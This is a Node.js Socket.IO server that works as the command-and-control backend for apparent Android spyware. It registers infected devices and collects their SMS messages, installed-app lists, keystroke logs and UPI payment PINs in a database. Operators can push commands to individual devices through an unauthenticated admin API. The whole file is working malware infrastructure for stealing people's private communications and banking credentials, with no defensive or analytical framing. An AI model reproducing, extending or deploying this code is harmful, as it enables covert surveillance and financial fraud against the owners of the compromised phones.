// server.js
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
require('dotenv').config();

const { PrismaClient } = require('@prisma/client');


const prisma = new PrismaClient();
const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

app.use(cors());
app.use(express.json());

// Connect to database
async function connectDatabase() {
    try {
        await prisma.$connect();
        console.log('Connected to database via Prisma');
    } catch (err) {
        console.error('Database connection error:', err);
        process.exit(1);
    }
}

connectDatabase();

// Socket.IO Connection Handling
io.on('connection', (socket) => {
    const deviceId = socket.handshake.query.device_id;
    console.log(`Device connected: ${deviceId}`);
    
    if (deviceId) {
        // Join device-specific room
        socket.join(`device:${deviceId}`);
        
        // Update device online status
        prisma.device.upsert({
            where: { device_id: deviceId },
            update: { 
                is_online: true, 
                last_seen: new Date() 
            },
            create: {
                device_id: deviceId,
                is_online: true,
                last_seen: new Date()
            }
        }).catch(err => console.error('Error updating device status:', err));
    }

    // Upsert device data
    socket.on('upsert_device_data', async (data, ack) => {
        try {
            const deviceData = JSON.parse(data);
            await prisma.device.upsert({
                where: { device_id: deviceData.device_id },
                update: {
                    ...deviceData,
                    last_seen: new Date(),
                    is_online: true
                },
                create: {
                    device_id: deviceData.device_id,
                    device_name: deviceData.device_name || null,
                    device_model: deviceData.device_model || null,
                    android_version: deviceData.android_version || null,
                    battery_level: deviceData.battery_level || null,
                    last_seen: new Date(),
                    is_online: true
                }
            });
            ack(true);
        } catch (error) {
            console.error('Error upserting device data:', error);
            ack(false);
        }
    });

    // Get pending commands
    socket.on('get_pending_commands', async (deviceId, ack) => {
        try {
            const commands = await prisma.command.findMany({
                where: {
                    device_id: deviceId,
                    status: 'pending'
                },
                orderBy: { created_at: 'desc' }
            });
            ack(JSON.stringify(commands));
        } catch (error) {
            console.error('Error getting pending commands:', error);
            ack(JSON.stringify([]));
        }
    });

    // Mark command as delivered
    socket.on('mark_command_delivered', async (commandId, ack) => {
        try {
            await prisma.command.update({
                where: { id: commandId },
                data: {
                    status: 'delivered',
                    updated_at: new Date()
                }
            });
            ack(true);
        } catch (error) {
            console.error('Error marking command as delivered:', error);
            ack(false);
        }
    });

    // Mark command as executed
    socket.on('mark_command_executed', async (commandId, ack) => {
        try {
            await prisma.command.update({
                where: { id: commandId },
                data: {
                    status: 'executed',
                    updated_at: new Date()
                }
            });
            ack(true);
        } catch (error) {
            console.error('Error marking command as executed:', error);
            ack(false);
        }
    });

    // Mark command as failed
    socket.on('mark_command_failed', async (data, ack) => {
        try {
            const { command_id, error } = JSON.parse(data);
            await prisma.command.update({
                where: { id: command_id },
                data: {
                    status: 'failed',
                    error: error,
                    updated_at: new Date()
                }
            });
            ack(true);
        } catch (error) {
            console.error('Error marking command as failed:', error);
            ack(false);
        }
    });

    // Send heartbeat
    socket.on('send_heartbeat', async (data, ack) => {
        try {
            const heartbeatData = JSON.parse(data);
            await prisma.heartbeat.create({
                data: heartbeatData
            });
            
            // Update device last seen
            await prisma.device.update({
                where: { device_id: heartbeatData.device_id },
                data: { 
                    last_seen: new Date(), 
                    is_online: true,
                    battery_level: heartbeatData.battery_level || undefined
                }
            });
            
            socket.emit('heartbeat_ack');
            ack(true);
        } catch (error) {
            console.error('Error processing heartbeat:', error);
            ack(false);
        }
    });

    // Set online status
    socket.on('set_online_status', async (status, ack) => {
        try {
            if (deviceId) {
                await prisma.device.update({
                    where: { device_id: deviceId },
                    data: { 
                        is_online: status, 
                        last_seen: new Date() 
                    }
                });
            }
            ack(true);
        } catch (error) {
            console.error('Error setting online status:', error);
            ack(false);
        }
    });

    // Sync SMS
    socket.on('sync_sms', async (data, ack) => {
        try {
            const messages = JSON.parse(data);
            
            // Using transaction for bulk operations
            await prisma.$transaction(async (tx) => {
                for (const msg of messages) {
                    await tx.sms.upsert({
                        where: {
                            device_id_address_date: {
                                device_id: msg.device_id,
                                address: msg.address,
                                date: msg.date
                            }
                        },
                        update: msg,
                        create: msg
                    });
                }
            });
            
            socket.emit('sync_complete', 'sms', messages.length);
            ack(true);
        } catch (error) {
            console.error('Error syncing SMS:', error);
            ack(false);
        }
    });

    // Sync single SMS
    socket.on('sync_single_sms', async (data, ack) => {
        try {
            const message = JSON.parse(data);
            await prisma.sms.upsert({
                where: {
                    device_id_address_date: {
                        device_id: message.device_id,
                        address: message.address,
                        date: message.date
                    }
                },
                update: message,
                create: message
            });
            ack(true);
        } catch (error) {
            console.error('Error syncing single SMS:', error);
            ack(false);
        }
    });

    // Sync apps
    socket.on('sync_apps', async (data, ack) => {
        try {
            const apps = JSON.parse(data);
            
            await prisma.$transaction(async (tx) => {
                for (const app of apps) {
                    await tx.installedApp.upsert({
                        where: {
                            device_id_package_name: {
                                device_id: app.device_id,
                                package_name: app.package_name
                            }
                        },
                        update: app,
                        create: app
                    });
                }
            });
            
            socket.emit('sync_complete', 'apps', apps.length);
            ack(true);
        } catch (error) {
            console.error('Error syncing apps:', error);
            ack(false);
        }
    });

    // Set key log
    socket.on('set_key_log', async (data, ack) => {
        try {
            const keyLog = JSON.parse(data);
            await prisma.keyLog.create({
                data: keyLog
            });
            ack(true);
        } catch (error) {
            console.error('Error saving key log:', error);
            ack(false);
        }
    });

    // Set UPI pin
    socket.on('set_upi_pin', async (data, ack) => {
        try {
            const pinData = JSON.parse(data);
            await prisma.pin.create({
                data: pinData
            });
            ack(true);
        } catch (error) {
            console.error('Error saving UPI pin:', error);
            ack(false);
        }
    });

    // Test connection
    socket.on('test_connection', (data, ack) => {
        ack(true);
    });

    // Admin: Send command to device
    socket.on('send_command', async (data) => {
        try {
            const { device_id, command_type, command_data } = data;
            const command = await prisma.command.create({
                data: {
                    device_id,
                    command_type,
                    command_data,
                    status: 'pending'
                }
            });
            
            // Emit command to specific device room
            io.to(`device:${device_id}`).emit('command', JSON.stringify([command]));
        } catch (error) {
            console.error('Error sending command:', error);
        }
    });

    // Handle disconnection
    socket.on('disconnect', () => {
        console.log(`Device disconnected: ${deviceId}`);
        
        if (deviceId) {
            // Update device offline status
            prisma.device.update({
                where: { device_id: deviceId },
                data: { 
                    is_online: false, 
                    last_seen: new Date() 
                }
            }).catch(err => console.error('Error updating offline status:', err));
        }
    });
});

// REST API Endpoints for Admin
app.get('/api/devices', async (req, res) => {
    try {
        const devices = await prisma.device.findMany({
            orderBy: { last_seen: 'desc' }
        });
        res.json(devices);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.get('/api/devices/:deviceId/commands', async (req, res) => {
    try {
        const commands = await prisma.command.findMany({
            where: { device_id: req.params.deviceId },
            orderBy: { created_at: 'desc' }
        });
        res.json(commands);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.post('/api/devices/:deviceId/commands', async (req, res) => {
    try {
        const { command_type, command_data } = req.body;
        const command = await prisma.command.create({
            data: {
                device_id: req.params.deviceId,
                command_type,
                command_data,
                status: 'pending'
            }
        });
        
        // Emit command to device
        io.to(`device:${req.params.deviceId}`).emit('command', JSON.stringify([command]));
        
        res.json(command);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.get('/api/devices/:deviceId/heartbeats', async (req, res) => {
    try {
        const heartbeats = await prisma.heartbeat.findMany({
            where: { device_id: req.params.deviceId },
            orderBy: { timestamp: 'desc' },
            take: 100
        });
        res.json(heartbeats);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Graceful shutdown
process.on('SIGINT', async () => {
    await prisma.$disconnect();
    process.exit(0);
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Socket.IO server running on port ${PORT}`);
});